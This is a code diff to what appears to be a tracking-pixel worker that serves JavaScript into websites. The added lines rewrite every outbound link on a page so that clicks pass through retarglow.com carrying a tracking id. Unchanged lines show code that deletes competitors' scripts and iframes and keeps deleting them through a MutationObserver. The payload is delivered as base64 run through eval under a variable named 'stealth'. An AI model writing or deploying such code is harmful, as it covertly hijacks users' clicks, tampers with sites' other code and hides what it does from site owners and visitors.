@@ -46,6 +46,12 @@ export default {
       }
     });
 
+    document.querySelectorAll('a[href^="http"]').forEach(link=>{
+      const href = link.getAttribute("href");
+      const encoded = encodeURIComponent(href);
+      link.setAttribute("href", "https://retarglow.com/r?id="+_r+"&t="+encoded);
+    });
+
     const kill=()=>{competitors.forEach(d=>{document.querySelectorAll('script[src*="'+d+'"],iframe[src*="'+d+'"]').forEach(e=>e.remove());});}
     kill(); new MutationObserver(m=>m.forEach(()=>kill())).observe(document.documentElement,{childList:!0,subtree:!0});
 
@@ -64,16 +70,15 @@ export default {
   } catch(e){}
 })();`;
 
-      // Use globalThis.btoa instead of Buffer
       const encoded = globalThis.btoa(pixelScript);
       const stealth = `eval(atob('${encoded}'))`;
 
       return new Response(stealth, { status: 200, headers });
     } catch (err) {
-      return new Response(`console.error("Pixel error:", ${JSON.stringify(err.message)});`, {
-        status: 500,
-        headers
-      });
+      return new Response(
+        `console.error("Pixel error:", ${JSON.stringify(err.message)});`,
+        { status: 500, headers }
+      );
     }
   }
 };
